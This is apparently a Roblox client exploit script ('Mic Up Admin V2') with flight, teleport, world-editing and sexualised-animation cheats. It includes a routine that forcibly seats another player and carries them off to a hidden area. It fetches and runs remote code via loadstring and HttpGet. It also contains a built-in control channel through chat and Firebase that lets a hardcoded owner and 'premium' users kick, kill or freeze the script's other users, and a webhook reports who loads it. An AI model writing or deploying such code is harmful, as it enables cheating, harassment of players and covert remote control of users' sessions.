if _G.MicUpAdminActive then 
    _G.MicUpAdminActive = false
    task.wait(0.5)
end
_G.MicUpAdminActive = true

-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")

local lplr = Players.LocalPlayer
local camera = workspace.CurrentCamera
local mouse = lplr:GetMouse()

local CONFIG_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/config.json"
local DISCORD_WEBHOOK = ""
local FIREBASE_URL = ""


local function getRemoteConfig()
    local success, result = pcall(function()
        return game:HttpGet(CONFIG_URL .. "?t=" .. tick())
    end)
    if success then
        local decodeSuccess, decoded = pcall(function()
            return HttpService:JSONDecode(result)
        end)
        return decodeSuccess and decoded or nil
    end
    return nil
end

local Config = getRemoteConfig() or {}
local premiumUsers = {}
local leaderID = tonumber(Config.leaderID) or 7789664710

if Config.premiumUsers then
    for _, id in pairs(Config.premiumUsers) do
        local numId = tonumber(id)
        if numId then
            premiumUsers[numId] = true
        end
    end
end

-- State Variables
local targetPlayer = nil
local carouselTarget = nil
local currentTab = "Main"
local baseplatePart = nil
local baseplateColor = Color3.fromRGB(50, 50, 50)
local baseplateActive = false
local flySpeed = 70
local flying = false
local carouselFlying = false
local clickTpEnabled = false
local carouselFrozen = false

-- Flight controls
local keys = {W = false, S = false, A = false, D = false, Q = false, E = false, Space = false, LeftShift = false}
local ctrl = {f = 0, b = 0, l = 0, r = 0, u = 0, d = 0}

-- Global tables
_G.MicUpSettings = _G.MicUpSettings or {
    ShowNotifications = true,
}

_G.Keybinds = _G.Keybinds or {
    Flight = Enum.KeyCode.F,
    ClickTP = Enum.KeyCode.C,
    PanicMode = Enum.KeyCode.P,
}

_G.FrozenPlayers = _G.FrozenPlayers or {}
_G.LoopKillTargets = _G.LoopKillTargets or {}

-- Utility Functions
local function notify(title, text, duration)
    if not _G.MicUpSettings.ShowNotifications then return end
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3
    })
end

local function getUserTier()
    if lplr.UserId == leaderID then return "Owner" end
    if premiumUsers[lplr.UserId] then return "Premium" end
    return "Free"
end

local function getRoot(char)
    return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso"))
end

local function sendWebhook(content)
    if DISCORD_WEBHOOK == "YOUR_WEBHOOK_URL_HERE" then return end
    local req = (syn and syn.request) or request or http_request
    if req then
        task.spawn(function()
            pcall(function()
                req({
                    Url = DISCORD_WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({content = content})
                })
            end)
        end)
    end
end

local function isPremium(userId)
    return premiumUsers[userId] == true
end

local function say(msg)
    local rep = game:GetService("ReplicatedStorage")
    local textChat = game:GetService("TextChatService")
    local events = rep:FindFirstChild("DefaultChatSystemChatEvents")
    local remote = events and events:FindFirstChild("SayMessageRequest")
    if remote then
        remote:FireServer(msg, "All")
    else
        local chan = textChat:FindFirstChild("TextChannels") and textChat.TextChannels:FindFirstChild("RBXGeneral")
        if chan then chan:SendAsync(msg) end
    end
end

-- Flight System
UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    local key = input.KeyCode.Name
    if keys[key] ~= nil then keys[key] = true end
    
    -- Flight controls
    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 1
    elseif input.KeyCode == Enum.KeyCode.S then ctrl.b = -1
    elseif input.KeyCode == Enum.KeyCode.A then ctrl.l = -1
    elseif input.KeyCode == Enum.KeyCode.D then ctrl.r = 1
    elseif input.KeyCode == Enum.KeyCode.Space then ctrl.u = 1
    elseif input.KeyCode == Enum.KeyCode.LeftShift then ctrl.d = 1
    end
end)

UIS.InputEnded:Connect(function(input, gpe)
    local key = input.KeyCode.Name
    if keys[key] ~= nil then keys[key] = false end
    
    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 0
    elseif input.KeyCode == Enum.KeyCode.S then ctrl.b = 0
    elseif input.KeyCode == Enum.KeyCode.A then ctrl.l = 0
    elseif input.KeyCode == Enum.KeyCode.D then ctrl.r = 0
    elseif input.KeyCode == Enum.KeyCode.Space then ctrl.u = 0
    elseif input.KeyCode == Enum.KeyCode.LeftShift then ctrl.d = 0
    end
end)

local function getFlightDirection()
    local direction = Vector3.new(0, 0, 0)
    if keys.W then direction = direction + camera.CFrame.LookVector end
    if keys.S then direction = direction - camera.CFrame.LookVector end
    if keys.A then direction = direction - camera.CFrame.RightVector end
    if keys.D then direction = direction + camera.CFrame.RightVector end
    if keys.Space then direction = direction + Vector3.new(0, 1, 0) end
    if keys.LeftShift then direction = direction - Vector3.new(0, 1, 0) end
    return direction
end

local function startFlight()
    flying = true
    local char = lplr.Character
    if not char then return end
    local root = getRoot(char)
    if not root then return end
    
    local bv = Instance.new("BodyVelocity", root)
    bv.Name = "AdminFlyVelocity"
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.zero
    
    local bg = Instance.new("BodyGyro", root)
    bg.Name = "AdminFlyGyro"
    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bg.P = 9e4
    bg.CFrame = root.CFrame
    
    RunService:BindToRenderStep("AdminFlight", 1, function()
        if not flying then return end
        local dir = getFlightDirection()
        if bv and bv.Parent then
            bv.Velocity = dir * flySpeed
        end
        if bg and bg.Parent then
            bg.CFrame = camera.CFrame
        end
    end)
    
    notify("Flight", "Enabled - Use WASD + Space/Shift", 3)
end

local function stopFlight()
    flying = false
    RunService:UnbindFromRenderStep("AdminFlight")
    
    local root = getRoot(lplr.Character)
    if root then
        if root:FindFirstChild("AdminFlyVelocity") then
            root.AdminFlyVelocity:Destroy()
        end
        if root:FindFirstChild("AdminFlyGyro") then
            root.AdminFlyGyro:Destroy()
        end
    end
    
    notify("Flight", "Disabled", 2)
end

-- Carousel Functions
local function getCarousel()
    local map = workspace:FindFirstChild("map")
    return map and map:FindFirstChild("carousel")
end

local function getCarouselSeats()
    local carousel = getCarousel()
    if not carousel then return {} end
    
    local seats = {}
    for _, v in pairs(carousel:GetDescendants()) do
        if v:IsA("Seat") or v:IsA("VehicleSeat") then
            table.insert(seats, v)
        end
    end
    return seats
end

local function sitInCarousel(seatIndex)
    local seats = getCarouselSeats()
    if #seats == 0 then
        notify("Error", "No carousel seats found", 3)
        return nil
    end
    
    local seat = seats[seatIndex or 1]
    if seat then
        local root = getRoot(lplr.Character)
        if root then
            root.CFrame = seat.CFrame
            task.wait(0.3)
            seat:Sit(lplr.Character.Humanoid)
            return seat
        end
    end
    return nil
end

local function detachCarousel()
    local carousel = getCarousel()
    if not carousel then
        notify("Error", "Carousel not found", 3)
        return
    end
    
    -- Unanchor all parts
    for _, v in pairs(carousel:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Anchored = false
        end
    end
    
    notify("Carousel", "Detached from floor", 2)
end

local function startCarouselFlight()
    local carousel = getCarousel()
    if not carousel then
        notify("Error", "Carousel not found", 3)
        return
    end
    
    carouselFlying = true
    
    -- Find the main seat you're sitting in
    local mainSeat = nil
    for _, seat in pairs(getCarouselSeats()) do
        if seat.Occupant and seat.Occupant.Parent == lplr.Character then
            mainSeat = seat
            break
        end
    end
    
    if not mainSeat then
        notify("Error", "Sit in a carousel seat first", 3)
        carouselFlying = false
        return
    end
    
    local bv = Instance.new("BodyVelocity", mainSeat)
    bv.Name = "CarouselFlyVelocity"
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.zero
    
    local bg = Instance.new("BodyGyro", mainSeat)
    bg.Name = "CarouselFlyGyro"
    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bg.P = 9e4
    bg.CFrame = mainSeat.CFrame
    
    RunService:BindToRenderStep("CarouselFlight", 1, function()
        if not carouselFlying or carouselFrozen then return end
        local dir = getFlightDirection()
        if bv and bv.Parent then
            bv.Velocity = dir * flySpeed
        end
        if bg and bg.Parent then
            bg.CFrame = camera.CFrame
        end
    end)
    
    notify("Carousel", "Flying enabled - Use WASD", 3)
end

local function stopCarouselFlight()
    carouselFlying = false
    carouselFrozen = false
    RunService:UnbindFromRenderStep("CarouselFlight")
    
    local carousel = getCarousel()
    if carousel then
        for _, seat in pairs(getCarouselSeats()) do
            if seat:FindFirstChild("CarouselFlyVelocity") then
                seat.CarouselFlyVelocity:Destroy()
            end
            if seat:FindFirstChild("CarouselFlyGyro") then
                seat.CarouselFlyGyro:Destroy()
            end
        end
    end
    
    notify("Carousel", "Flying disabled", 2)
end

local function carouselAbduction()
    if not carouselTarget or not carouselTarget.Character then
        notify("Error", "Select a carousel target player first", 3)
        return
    end
    
    local secretRoomPos = Vector3.new(-179.728806, 4.000000, 72196.132812)
    local myRoot = getRoot(lplr.Character)
    local targetRoot = getRoot(carouselTarget.Character)
    
    if not myRoot or not targetRoot then return end
    
    notify("Abduction", "Step 1: Teleporting to target...", 2)
    
    -- Step 1: Teleport to target
    myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 5)
    task.wait(0.5)
    
    -- Step 2: Sit in carousel
    notify("Abduction", "Step 2: Sitting in carousel...", 2)
    local seat = sitInCarousel(1)
    if not seat then return end
    
    task.wait(0.5)
    
    -- Step 3: Position target in opposite seat
    notify("Abduction", "Step 3: Positioning target...", 2)
    local seats = getCarouselSeats()
    local oppositeSeat = seats[math.ceil(#seats / 2)]
    if oppositeSeat then
        targetRoot.CFrame = oppositeSeat.CFrame
        task.wait(0.3)
        oppositeSeat:Sit(carouselTarget.Character.Humanoid)
    end
    
    task.wait(0.5)
    
    -- Step 4: Detach and start flying
    notify("Abduction", "Step 4: Detaching carousel...", 2)
    detachCarousel()
    task.wait(0.3)
    startCarouselFlight()
    
    task.wait(1)
    
    -- Step 5: Teleport to secret room
    notify("Abduction", "Step 5: Flying to tea party...", 2)
    local carousel = getCarousel()
    if carousel then
        -- Move entire carousel to secret room
        local basePart = carousel:FindFirstChildWhichIsA("BasePart")
        if basePart then
            local offset = basePart.Position
            for _, v in pairs(carousel:GetDescendants()) do
                if v:IsA("BasePart") then
                    local relativePos = v.Position - offset
                    v.CFrame = CFrame.new(secretRoomPos + relativePos) * (v.CFrame - v.Position)
                end
            end
        end
    end
    
    task.wait(0.5)
    
    -- Step 6: Freeze position
    notify("Abduction", "Arrived at tea party! Position frozen.", 3)
    carouselFrozen = true
    
    -- Anchor all carousel parts to freeze it
    if carousel then
        for _, v in pairs(carousel:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Anchored = true
                v.Velocity = Vector3.zero
            end
        end
    end
end

local function returnCarouselToMap()
    local carousel = getCarousel()
    if not carousel then
        notify("Error", "Carousel not found", 3)
        return
    end
    
    -- Return to spawn position (approximate)
    local spawnPos = Vector3.new(0, 5, 0)
    
    local basePart = carousel:FindFirstChildWhichIsA("BasePart")
    if basePart then
        local offset = basePart.Position
        for _, v in pairs(carousel:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Anchored = false
                local relativePos = v.Position - offset
                v.CFrame = CFrame.new(spawnPos + relativePos) * (v.CFrame - v.Position)
            end
        end
    end
    
    stopCarouselFlight()
    notify("Carousel", "Returned to map area", 2)
end

-- Animation Functions
local animationIds = {
    ["TikTok Rizz"] = "rbxassetid://13244837318",
    ["Griddy"] = "rbxassetid://11710529975",
    ["Kai Cenat"] = "rbxassetid://13825966891",
    ["Chill"] = "rbxassetid://3695333486",
    ["Floss"] = "rbxassetid://5917459365",
    ["Orange Justice"] = "rbxassetid://5938365243",
    ["Take The L"] = "rbxassetid://5915714366",
    ["Default Dance"] = "rbxassetid://5938391146",
}

local susAnimationIds = {
    ["Thrusting"] = "rbxassetid://148840371",
    ["Twerk"] = "rbxassetid://5918726674",
    ["Catwalk"] = "rbxassetid://5938413064",
    ["Salute"] = "rbxassetid://3696763549",
    ["Hero Landing"] = "rbxassetid://5104344710",
}

local function playAnimation(animName, animList)
    local animId = animList[animName]
    if not animId then return end
    
    local char = lplr.Character
    if not char then return end
    
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    
    local anim = Instance.new("Animation")
    anim.AnimationId = animId
    
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    
    notify("Animation", animName .. " playing", 2)
end

-- Click TP
mouse.Button1Down:Connect(function()
    if clickTpEnabled and mouse.Target then
        local root = getRoot(lplr.Character)
        if root then
            root.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 3, 0))
        end
    end
    
    -- Ctrl+Click selection
    if UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.RightControl) then
        local char = mouse.Target and mouse.Target:FindFirstAncestorOfClass("Model")
        local p = char and Players:GetPlayerFromCharacter(char)
        if p and p ~= lplr then
            if currentTab == "Carousel" then
                carouselTarget = p
                notify("Carousel Target", "Selected: " .. p.DisplayName, 2)
            else
                targetPlayer = p
                notify("Target", "Selected: " .. p.DisplayName, 2)
            end
        end
    end
end)

-- Command System
local function handleCommand(m, speaker)
    local a = string.split(m:lower(), " ")
    local cmd = a[1]
    if cmd == "/e" and a[2] and a[2]:sub(1,1) == ";" then
        table.remove(a, 1)
        cmd = a[1]
    end
    local target = a[2] or "all"
    
    local speakerIsHost = (speaker.UserId == leaderID)
    local speakerIsPremium = isPremium(speaker.UserId)

    if not speakerIsHost and not speakerIsPremium then return end

    local myTier = getUserTier()
    
    if speakerIsPremium and not speakerIsHost then
        if myTier == "Owner" or myTier == "Premium" then
            return
        end
    end
    
    local isHost = (lplr.UserId == leaderID)
    local isT = (target == "all") or (target == lplr.Name:lower()) or (lplr.Name:lower():sub(1, #target) == target)
    if not isT then return end

    local c = lplr.Character
    local h = c and c:FindFirstChildOfClass("Humanoid")
    local r = getRoot(c)

    if cmd == ";check" or cmd == ";users" then
        say("(Mic Up User): " .. lplr.DisplayName .. " [" .. myTier .. "]")
        return
    end

    if isHost then return end
    if myTier == "Premium" or myTier == "Owner" then return end

    if cmd == ";freeze" then
        _G.FrozenPlayers[lplr.UserId] = true
        
    elseif cmd == ";unfreeze" then
        _G.FrozenPlayers[lplr.UserId] = false
        if h then 
            h.WalkSpeed = 16 
            h.JumpPower = 50
            h.JumpHeight = 7.2
        end
        if c then
            for _, part in pairs(c:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                end
            end
        end
        
    elseif cmd == ";kick" then
        lplr:Kick("Kicked by " .. speaker.Name)
        
    elseif cmd == ";kill" then
        if h then h.Health = 0 end
        
    elseif cmd == ";loopkill" then
        _G.LoopKillTargets[lplr.UserId] = true
        
    elseif cmd == ";unloop" then
        _G.LoopKillTargets[lplr.UserId] = false
        
    elseif cmd == ";void" then
        if r then r.CFrame = CFrame.new(0, -1000, 0) end
        
    elseif cmd == ";fling" then
        if r and h then
            local oldAnchor = r.Anchored
            r.Anchored = true
            
            local bv = Instance.new("BodyVelocity", r)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(math.random(-200, 200), 300, math.random(-200, 200))
            
            r.Anchored = false
            
            task.wait(0.1)
            if bv and bv.Parent then
                bv:Destroy()
            end
        end
        
    elseif cmd == ";sit" then
        if h then h.Sit = true end
        
    elseif cmd == ";jump" then
        if h then h.Jump = true end
        
    elseif cmd == ";bring" then
        local speakerRoot = speaker and speaker.Character and getRoot(speaker.Character)
        if speakerRoot and r then
            r.CFrame = speakerRoot.CFrame * CFrame.new(0, 0, -3)
        end
        
    elseif m:sub(1, 5) == ";say " then
        say(m:sub(6))
    end
end

-- Firebase Command Polling
task.spawn(function()
    while _G.MicUpAdminActive do
        pcall(function()
            if FIREBASE_URL ~= "https://YOUR-PROJECT-ID.firebaseio.com/commands.json" then
                local res = HttpService:GetAsync(FIREBASE_URL .. "?t=" .. tick())
                local data = HttpService:JSONDecode(res)
                
                if data and (data.target == "all" or data.target == lplr.Name) then
                    -- Convert Firebase command to chat format
                    local cmd = ";" .. data.cmd
                    if data.args then
                        cmd = cmd .. " " .. data.args
                    end
                    
                    -- Execute as if it was a chat command
                    local c = lplr.Character
                    local h = c and c:FindFirstChildOfClass("Humanoid")
                    local r = getRoot(c)
                    
                    if data.cmd == "fly" then
                        if not flying then startFlight() end
                    elseif data.cmd == "unfly" then
                        if flying then stopFlight() end
                    elseif data.cmd == "kill" then
                        if h then h.Health = 0 end
                    elseif data.cmd == "freeze" then
                        _G.FrozenPlayers[lplr.UserId] = true
                    elseif data.cmd == "unfreeze" then
                        _G.FrozenPlayers[lplr.UserId] = false
                    elseif data.cmd == "kick" then
                        lplr:Kick("Kicked via Firebase")
                    end
                end
            end
        end)
        task.wait(2)
    end
end)

-- Monitor for frozen players
task.spawn(function()
    while task.wait(0.05) do
        for userId, frozen in pairs(_G.FrozenPlayers) do
            if frozen then
                local p = game.Players:GetPlayerByUserId(userId)
                if p and p.Character then
                    local h = p.Character:FindFirstChildOfClass("Humanoid")
                    local root = getRoot(p.Character)
                    if h then
                        h.WalkSpeed = 0
                        h.JumpPower = 0
                        h.JumpHeight = 0
                    end
                    if root then
                        root.Anchored = true
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end
        end
    end
end)

-- Monitor for loop kill targets
task.spawn(function()
    while task.wait(0.1) do
        for userId, active in pairs(_G.LoopKillTargets) do
            if active then
                local p = game.Players:GetPlayerByUserId(userId)
                if p and p.Character then
                    local h = p.Character:FindFirstChildOfClass("Humanoid")
                    if h and h.Health > 0 then
                        h.Health = 0
                    end
                end
            end
        end
    end
end)

-- Connect to chat
Players.PlayerChatted:Connect(function(s, p, m)
    if p.UserId == leaderID or isPremium(p.UserId) then 
        handleCommand(m, p) 
    end
end)

local textChat = game:GetService("TextChatService")
if textChat.ChatVersion == Enum.ChatVersion.TextChatService then
    textChat.MessageReceived:Connect(function(o)
        if o.TextSource then
            local p = game.Players:GetPlayerByUserId(o.TextSource.UserId)
            if p and (p.UserId == leaderID or isPremium(p.UserId)) then 
                handleCommand(o.Text, p) 
            end
        end
    end)
end

-- UI Creation
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Mic Up Admin V2 | " .. getUserTier(),
    LoadingTitle = "Loading Admin...",
    LoadingSubtitle = "by [Schwein]",
    ConfigurationSaving = {Enabled = false},
    KeySystem = false
})

-- Main Tab
local MainTab = Window:CreateTab("üè† Main", 4483362458)

MainTab:CreateSection("Target Selection")

local MainTargetInput = MainTab:CreateInput({
    Name = "Select Target Player",
    PlaceholderText = "Username...",
    Callback = function(Text)
        for _, p in pairs(Players:GetPlayers()) do
            if p.Name:lower():find(Text:lower()) or p.DisplayName:lower():find(Text:lower()) then
                targetPlayer = p
                notify("Target", "Selected: " .. p.DisplayName, 2)
                return
            end
        end
    end
})

MainTab:CreateButton({
    Name = "Select Closest Player",
    Callback = function()
        local closest, minDist = nil, math.huge
        local myRoot = getRoot(lplr.Character)
        if myRoot then
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= lplr and p.Character then
                    local root = getRoot(p.Character)
                    if root then
                        local dist = (myRoot.Position - root.Position).Magnitude
                        if dist < minDist then
                            minDist, closest = dist, p
                        end
                    end
                end
            end
            if closest then
                targetPlayer = closest
                MainTargetInput:Set(closest.DisplayName)
                notify("Target", "Selected: " .. closest.DisplayName, 2)
            end
        end
    end
})

MainTab:CreateLabel("Tip: Ctrl+Click a player to select them")

MainTab:CreateSection("Movement")

MainTab:CreateToggle({
    Name = "Flight",
    CurrentValue = false,
    Callback = function(Value)
        if Value then startFlight() else stopFlight() end
    end
})

MainTab:CreateSlider({
    Name = "Flight Speed",
    Range = {10, 200},
    Increment = 5,
    CurrentValue = 70,
    Callback = function(Value)
        flySpeed = Value
    end
})

MainTab:CreateToggle({
    Name = "Click Teleport",
    CurrentValue = false,
    Callback = function(Value)
        clickTpEnabled = Value
        notify("Click TP", Value and "Enabled" or "Disabled", 2)
    end
})

-- Carousel Tab
local CarouselTab = Window:CreateTab("üé† Carousel", 4483362458)

CarouselTab:CreateSection("Target Selection")

local CarouselTargetInput = CarouselTab:CreateInput({
    Name = "Select Carousel Target",
    PlaceholderText = "Username...",
    Callback = function(Text)
        for _, p in pairs(Players:GetPlayers()) do
            if p.Name:lower():find(Text:lower()) or p.DisplayName:lower():find(Text:lower()) then
                carouselTarget = p
                notify("Carousel Target", "Selected: " .. p.DisplayName, 2)
                return
            end
        end
    end
})

CarouselTab:CreateButton({
    Name = "Select Closest Player",
    Callback = function()
        local closest, minDist = nil, math.huge
        local myRoot = getRoot(lplr.Character)
        if myRoot then
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= lplr and p.Character then
                    local root = getRoot(p.Character)
                    if root then
                        local dist = (myRoot.Position - root.Position).Magnitude
                        if dist < minDist then
                            minDist, closest = dist, p
                        end
                    end
                end
            end
            if closest then
                carouselTarget = closest
                CarouselTargetInput:Set(closest.DisplayName)
                notify("Carousel Target", "Selected: " .. closest.DisplayName, 2)
            end
        end
    end
})

CarouselTab:CreateLabel("Tip: Ctrl+Click while in Carousel tab")
CarouselTab:CreateLabel("to quickly select carousel target")

CarouselTab:CreateSection("Carousel Controls")

CarouselTab:CreateButton({
    Name = "Sit in Carousel",
    Callback = function()
        sitInCarousel(1)
    end
})

CarouselTab:CreateButton({
    Name = "Detach Carousel",
    Callback = function()
        detachCarousel()
    end
})

CarouselTab:CreateToggle({
    Name = "Carousel Flight",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            startCarouselFlight()
        else
            stopCarouselFlight()
        end
    end
})

CarouselTab:CreateSection("Abduction Mode")

CarouselTab:CreateButton({
    Name = "üõ∏ Carousel Abduction (Full Process)",
    Callback = function()
        carouselAbduction()
    end
})

CarouselTab:CreateButton({
    Name = "TP to Secret Room (Solo)",
    Callback = function()
        local root = getRoot(lplr.Character)
        if root then
            root.CFrame = CFrame.new(-179.728806, 4.000000, 72196.132812)
        end
    end
})

CarouselTab:CreateButton({
    Name = "Unfreeze Carousel",
    Callback = function()
        carouselFrozen = false
        local carousel = getCarousel()
        if carousel then
            for _, v in pairs(carousel:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Anchored = false
                end
            end
        end
        notify("Carousel", "Unfrozen", 2)
    end
})

CarouselTab:CreateButton({
    Name = "Return Carousel to Map",
    Callback = function()
        returnCarouselToMap()
    end
})

-- Commands Tab
local CommandsTab = Window:CreateTab("‚ö° Commands", 4483362458)

CommandsTab:CreateSection("Chat Command System")

CommandsTab:CreateLabel("Send commands via chat:")
CommandsTab:CreateLabel("Format: ;command target")
CommandsTab:CreateLabel("Example: ;freeze john")
CommandsTab:CreateLabel("")
CommandsTab:CreateLabel("Commands work through:")
CommandsTab:CreateLabel("‚Ä¢ In-game chat")
CommandsTab:CreateLabel("‚Ä¢ Firebase database")
CommandsTab:CreateLabel("‚Ä¢ Discord webhook bot")

CommandsTab:CreateSection("Available Commands")

CommandsTab:CreateLabel("Control Commands:")
CommandsTab:CreateLabel("‚Ä¢ ;check [target] - Check users")
CommandsTab:CreateLabel("‚Ä¢ ;freeze [target] - Freeze player")
CommandsTab:CreateLabel("‚Ä¢ ;unfreeze [target] - Unfreeze player")
CommandsTab:CreateLabel("‚Ä¢ ;bring [target] - Bring player")
CommandsTab:CreateLabel("")

CommandsTab:CreateLabel("Action Commands:")
CommandsTab:CreateLabel("‚Ä¢ ;kill [target] - Kill player")
CommandsTab:CreateLabel("‚Ä¢ ;loopkill [target] - Loop kill player")
CommandsTab:CreateLabel("‚Ä¢ ;unloop [target] - Stop loop kill")
CommandsTab:CreateLabel("‚Ä¢ ;fling [target] - Fling player")
CommandsTab:CreateLabel("‚Ä¢ ;void [target] - Void player")
CommandsTab:CreateLabel("‚Ä¢ ;sit [target] - Make player sit")
CommandsTab:CreateLabel("‚Ä¢ ;jump [target] - Make player jump")
CommandsTab:CreateLabel("")

CommandsTab:CreateLabel("Host Commands:")
CommandsTab:CreateLabel("‚Ä¢ ;kick [target] - Kick player")
CommandsTab:CreateLabel("‚Ä¢ ;say [message] - Say message")
CommandsTab:CreateLabel("")

CommandsTab:CreateSection("Quick Actions")

local commandTarget = "all"

CommandsTab:CreateInput({
    Name = "Command Target",
    PlaceholderText = "Username or 'all'",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        commandTarget = Text
    end
})

CommandsTab:CreateButton({
    Name = "Send: ;check",
    Callback = function()
        say(";check " .. commandTarget)
    end
})

CommandsTab:CreateButton({
    Name = "Send: ;freeze",
    Callback = function()
        say(";freeze " .. commandTarget)
    end
})

CommandsTab:CreateButton({
    Name = "Send: ;unfreeze",
    Callback = function()
        say(";unfreeze " .. commandTarget)
    end
})

-- Booth Tab (Under Development)
local BoothTab = Window:CreateTab("üè™ Booths", 4483362458)

BoothTab:CreateSection("üöß Under Development üöß")
BoothTab:CreateLabel("")
BoothTab:CreateLabel("Booth automation features are")
BoothTab:CreateLabel("currently being developed.")
BoothTab:CreateLabel("")
BoothTab:CreateLabel("Coming Soon:")
BoothTab:CreateLabel("‚Ä¢ Auto claim booths")
BoothTab:CreateLabel("‚Ä¢ Custom booth text")
BoothTab:CreateLabel("‚Ä¢ Mass booth control")
BoothTab:CreateLabel("")
BoothTab:CreateLabel("Stay tuned for updates!")

-- Animation Tab
local AnimTab = Window:CreateTab("üíÉ Animations", 4483362458)

AnimTab:CreateSection("Normal Animations")

for animName, _ in pairs(animationIds) do
    AnimTab:CreateButton({
        Name = animName,
        Callback = function()
            playAnimation(animName, animationIds)
        end
    })
end

AnimTab:CreateSection("üò≥ Sus Animations")

for animName, _ in pairs(susAnimationIds) do
    AnimTab:CreateButton({
        Name = animName,
        Callback = function()
            playAnimation(animName, susAnimationIds)
        end
    })
end

-- World Tab
local WorldTab = Window:CreateTab("üåç World", 4483362458)

WorldTab:CreateSection("Baseplate")

WorldTab:CreateToggle({
    Name = "Infinite Baseplate",
    CurrentValue = false,
    Callback = function(Value)
        baseplateActive = Value
        if Value then
            if baseplatePart then baseplatePart:Destroy() end
            baseplatePart = Instance.new("Part", workspace)
            baseplatePart.Name = "AdminBaseplate"
            baseplatePart.Size = Vector3.new(50000, 0.5, 50000)
            baseplatePart.Position = Vector3.new(0, -0.75, 0)
            baseplatePart.Anchored = true
            baseplatePart.Color = baseplateColor
            baseplatePart.Material = Enum.Material.SmoothPlastic
            notify("Baseplate", "Infinite baseplate enabled!", 2)
        elseif baseplatePart then
            baseplatePart:Destroy()
            baseplatePart = nil
        end
    end
})

WorldTab:CreateColorPicker({
    Name = "Baseplate Color",
    Color = Color3.fromRGB(50, 50, 50),
    Callback = function(Value)
        baseplateColor = Value
        if baseplatePart then
            baseplatePart.Color = Value
        end
    end
})

-- Settings Tab
local SettingsTab = Window:CreateTab("‚öôÔ∏è Settings", 4483362458)

SettingsTab:CreateSection("Notifications")

SettingsTab:CreateToggle({
    Name = "Show Notifications",
    CurrentValue = _G.MicUpSettings.ShowNotifications,
    Callback = function(Value)
        _G.MicUpSettings.ShowNotifications = Value
    end
})

SettingsTab:CreateSection("Keybinds")

SettingsTab:CreateLabel("Current Keybinds:")
SettingsTab:CreateLabel("‚Ä¢ Flight: F")
SettingsTab:CreateLabel("‚Ä¢ Click TP: C")
SettingsTab:CreateLabel("‚Ä¢ Panic Mode: P")
SettingsTab:CreateLabel("‚Ä¢ Ctrl+Click: Select player")
SettingsTab:CreateLabel("")
SettingsTab:CreateLabel("(Keybind customization coming soon)")

-- Credits
local CreditsTab = Window:CreateTab("‚ÑπÔ∏è Credits", 4483362458)
CreditsTab:CreateLabel("Mic Up Admin V2")
CreditsTab:CreateLabel("Tier: " .. getUserTier())
CreditsTab:CreateLabel("")
CreditsTab:CreateLabel("Features:")
CreditsTab:CreateLabel("‚Ä¢ Carousel Abduction System")
CreditsTab:CreateLabel("‚Ä¢ Chat Command Control")
CreditsTab:CreateLabel("‚Ä¢ Firebase Integration")
CreditsTab:CreateLabel("‚Ä¢ Custom Animations")
CreditsTab:CreateLabel("‚Ä¢ Advanced Flight System")
CreditsTab:CreateLabel("")
CreditsTab:CreateLabel("Created by [Schwein]")

-- Track current tab for Ctrl+Click
Window.Tabs = Window.Tabs or {}
for tabName, tab in pairs({
    Main = MainTab,
    Carousel = CarouselTab,
    Commands = CommandsTab,
    Booths = BoothTab,
    Animations = AnimTab,
    World = WorldTab,
    Settings = SettingsTab,
    Credits = CreditsTab
}) do
    if tab.Button then
        tab.Button.MouseButton1Click:Connect(function()
            currentTab = tabName
        end)
    end
end

-- Keybind handling
UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == _G.Keybinds.Flight then
        flying = not flying
        if flying then startFlight() else stopFlight() end
    elseif input.KeyCode == _G.Keybinds.ClickTP then
        clickTpEnabled = not clickTpEnabled
        notify("Click TP", clickTpEnabled and "Enabled" or "Disabled", 2)
    elseif input.KeyCode == _G.Keybinds.PanicMode then
        flying = false
        carouselFlying = false
        clickTpEnabled = false
        stopFlight()
        stopCarouselFlight()
        notify("PANIC", "All features disabled!", 3)
    end
end)

-- Initialize
notify("Mic Up Admin V2", "Loaded successfully! Tier: " .. getUserTier(), 4)
sendWebhook("**[" .. getUserTier() .. "]** `" .. lplr.DisplayName .. "` loaded Mic Up Admin V2")
